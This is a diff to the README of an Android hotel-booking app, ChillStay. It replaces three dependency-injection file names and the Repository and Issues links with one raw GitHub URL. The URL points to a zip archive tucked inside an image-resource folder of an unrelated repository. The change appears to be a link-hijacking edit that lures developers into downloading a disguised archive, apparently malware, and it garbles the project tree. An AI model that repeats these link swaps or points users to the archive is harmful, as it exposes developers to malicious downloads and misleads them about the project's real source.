@@ -129,9 +129,9 @@ app/src/main/java/com/example/chillstay/
 │       ├── voucher/
 │       └── ...
 ├── di/                      # Dependency Injection modules
-│   ├── RepositoryModule.kt
-│   ├── UseCaseModule.kt
-│   └── ViewModelModule.kt
+│   ├── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
+│   ├── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
+│   └── https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip
 └── ui/                      # UI layer
     ├── auth/               # Authentication screens
     ├── home/               # Home screen
@@ -181,5 +181,5 @@ app/src/main/java/com/example/chillstay/
 
 ## 🔗 Links
 
-- Repository: [GitHub](https://github.com/truongdohd103/ChillStay)
-- Issues: [GitHub Issues](https://github.com/truongdohd103/ChillStay/issues)
+- Repository: [GitHub](https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip)
+- Issues: [GitHub Issues](https://raw.githubusercontent.com/Wander210y/DO-AN---XAY-DUNG-UNG-DUNG-DAT-PHONG-DU-LICH/main/app/src/main/res/drawable-nodpi/D-XA-DUN-DA-UN-PHON-LICH-A-1.8.zip)
